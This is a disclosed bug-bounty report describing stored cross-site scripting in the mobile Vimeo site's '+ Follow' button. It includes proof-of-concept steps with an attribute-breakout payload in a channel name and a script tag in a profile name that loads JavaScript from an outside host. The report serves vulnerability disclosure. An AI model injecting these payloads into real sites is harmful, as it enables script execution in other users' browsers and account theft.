# XSS on mobile version of vimeo.com where the button "Follow" appears

## Report Details
- **Report ID**: 88088
- **URL**: https://hackerone.com/reports/88088
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-09-09T01:05:03.374Z
- **Disclosed**: 2017-08-31T10:17:58.889Z

## Reporter
- **Username**: stefanovettorazzi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vimeo

## Vulnerability Information
__Description__

In the mobile version of https://vimeo.com, you will see _+ Follow_ buttons in places like the description of a channel, the description of a video, the profile of a user, the list of users you follow and the list of users that other users follow.
The problem is that the code that builds the button doesn't escape the Name of the channel or user. This allows to insert HTML code, even in the channel Name because the value is inserted as attribute of a `<button>` element.

__Proof of concept__

Channel page. Requires user interaction:
    1. Using the desktop web version of Vimeo, go to https://vimeo.com/[your_vimeo_url]/channels (like https://vimeo.com/user36690798/channels).
    2. Click on _+ Create new channel_ at the right of the page.
    3. Enter `" ontouchstart="alert(document.domain)` for _Channel Name_.
    4. Click on _Create This Channel_.
    5. Copy & save the URL of the new Channel.
    6. Using the mobile web version of Vimeo and other user, go to the URL you saved in the last step (like https://vimeo.com/channels/963609).
    7. Touch on _+ Follow_.
    8. `alert(document.domain)` is executed.
I have a Channel with the XSS here https://vimeo.com/channels/962193.

Profile page. Doesn't require user interaction:
    1. Using the web version of Vimeo, go to https://vimeo.com/settings.
    2. Copy & save your _Vimeo URL_.
    3. Change your _Name_ to `"><script src=//u00f1.xyz>`.
    4. Click on _Save Changes_.
    5. Using the mobile web version of Vimeo and other user, go to the URL you saved in step 2.
    6. `alert(document.domain)` is executed.
I have a profile with the XSS here https://vimeo.com/user36690798.

I think that the bug is in the code that builds the _+ Follow_ button, because the same vulnerability is in the other places I mentioned in the Description.

## Attachments
No attachments
